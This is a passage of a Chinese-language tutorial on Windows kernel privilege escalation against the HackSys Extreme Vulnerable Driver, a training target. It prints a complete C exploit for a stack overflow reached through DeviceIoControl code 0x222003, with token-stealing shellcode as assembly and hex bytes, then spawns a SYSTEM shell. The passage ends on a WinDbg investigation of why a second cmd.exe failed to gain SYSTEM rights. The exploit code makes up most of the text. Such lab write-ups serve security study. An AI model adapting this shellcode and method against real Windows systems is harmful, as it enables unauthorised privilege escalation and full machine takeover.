继续
提权成功
完整提权代码
    #define _CRT_SECURE_NO_WARNINGS
    #include 
    #include 
    #define handle_error(msg, error_code) \
        do  \
        {                             \
            printf("%s with error code: %d\n", msg, error_code); \
        } while (0);
    void exp()
    {
        do {
            HANDLE hDevice;
            hDevice = CreateFileA(
                /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
                /* DWORD dwDesiredAccess */ 0xC0000000,
                /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
                /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
                /* DWORD dwCreationDisposition */ OPEN_EXISTING,
                /* DWORD dwFlagsAndAttributes */ 0,
                /* HANDLE hTemplateFile */ NULL);
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                handle_error("Open device failed!\n", GetLastError());
                break;
            }
            /*
            pushad                              ; Save registers state
            ; Start of Token Stealing Stub
            xor eax, eax                        ; Set ZERO
            mov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread
                                                ; _KTHREAD is located at FS : [0x124]
            mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Process
            mov ecx, eax                        ; Copy current process _EPROCESS structure
            mov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID = 0x4
            SearchSystemPID:
            mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, 0B8h
            cmp [eax + 0B4h], edx               ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
            mov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Token
            mov [ecx + 0F8h], edx               ; Replace target process nt!_EPROCESS.Token
                                                ; with SYSTEM process nt!_EPROCESS.Token
            popad
            xor eax, eax                        ; restore environment
            pop ebp
            ret 8
            */
            ULONG ulShellcode[] = {
                0x64c03160,
                0x0124808b,
                0x408b0000,
                0xbac18950,
                0x4,
                0x00b8808b,
                0xb82d0000,
                0x39000000,
                0x0000b490,
                0x8bed7500,
                0x0000f890,
                0xf8918900,
                0x61000000,
                0xc25dc031,
                0x8
            };
            PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (pEopPayload == NULL)
            {
                handle_error("VirtualAlloc", GetLastError());
                break;
            }
            RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));
            DWORD dwInBufferSize = 2080 + 4;
            UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
            if (pInBuffer == NULL)
            {
                handle_error("HeapAlloc", GetLastError());
                break;
            }
            RtlFillMemory(pInBuffer, 2080, 0x41);
            PVOID pShellcode = &pEopPayload;
            PVOID *ppShellcode = &pEopPayload;
            RtlCopyMemory(pInBuffer + 2080, ppShellcode, 4);
            DWORD dwReturnedBytes = 0;
            if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
                system("cmd.exe");
            }
            if (pInBuffer != NULL)
                HeapFree(GetProcessHeap(), 0, pInBuffer);
            if (pEopPayload != NULL)
                VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
        } while (0);
    }
    int main()
    {
        exp();
        return 0;
    }
###  一个有意思的问题
在做上面的实验时，遇到了一个比较隐蔽的问题，调试了很久，最终才发现原因，在这里也跟大家讨论讨论，避免大家以后遇到这个问题，不知道是为什么
如果`exp`的代码这么写
    void exp()
    {
        ...
        do 
        {
            ...
            if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
                // system("cmd.exe"); // 注释掉这一行代码
            }
            if (pInBuffer != NULL)
                HeapFree(GetProcessHeap(), 0, pInBuffer);
            if (pEopPayload != NULL)
                VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
        } while (0);
    }
    ...
注释掉之后，我们通过`cmd.exe`启动另一个`cmd.exe`，新启动的`cmd.exe`会是`system`权限吗？  
编译执行，为了不掺杂别的影响，我们把系统重启一下，看看结果
可以发现，无论是原先的`cmd.exe`还是新启动的`cmd.exe`，权限都没有提升成功。这个问题困扰了我大概两个晚上的下班时间，期间找了各种资料，以为`shellcode`出问题了，我在`shellcode`下断点，一步一步执行，怎么想都是成功的改变了`cmd.exe`的`token`数据，为什么会失败呢？
失败的地方就在这里，我以为我该成功了，但事实是没有成功，来通过`windbg`看一下，首先关闭新启动的`cmd.exe`，只保留我以为我成功改变`token`的`cmd`
列一下进程
    kd> !dml_proc
    Address  PID  Image file name
    869eb920 4    System         
    87dfea68 104  smss.exe       
    883e4400 158  csrss.exe      
    88a6a108 18c  wininit.exe    
    88415030 198  csrss.exe      
    88475d40 1d4  winlogon.exe   
    8baeac48 204  services.exe   
    885b9030 20c  lsass.exe      
    885c5030 214  lsm.exe        
    88646378 27c  svchost.exe    
    8858ad40 2c0  svchost.exe    
    8866aab0 2f4  svchost.exe    
    8867fd40 33c  svchost.exe    
    96bff478 3ac  svchost.exe    
    886ea030 428  svchost.exe    
    88701a60 470  svchost.exe    
    8875bd40 4f4  spoolsv.exe    
    887446a8 520  svchost.exe    
    887838c8 570  taskhost.exe   
    8879ac40 5b8  dwm.exe        
    887a2448 5d4  explorer.exe   
    887f8408 660  vm3dservice.ex 
    887fa6f0 668  vmtoolsd.exe   
    887d2d40 6b0  VGAuthService. 
    8892db18 6ec  vmtoolsd.exe   
    889a2338 414  WmiPrvSE.exe   
    88a04030 648  dllhost.exe    
    8747e030 604  msdtc.exe      
    887d8030 820  SearchIndexer. 
    88af13b0 8ac  wmpnetwk.exe   
    88afb8f0 8f4  svchost.exe    
    873e1920 a58  WmiPrvSE.exe   
    87e77030 be4  OSRLOADER.exe  
    99bfc158 bfc  cmd.exe        
    98332d40 c04  conhost.exe    
    88a0e030 e50  sppsvc.exe     
    955ff300 e74  svchost.exe
查看一下`system`进程及其`token`信息
    kd> dt _EPROCESS 869eb920 ; system process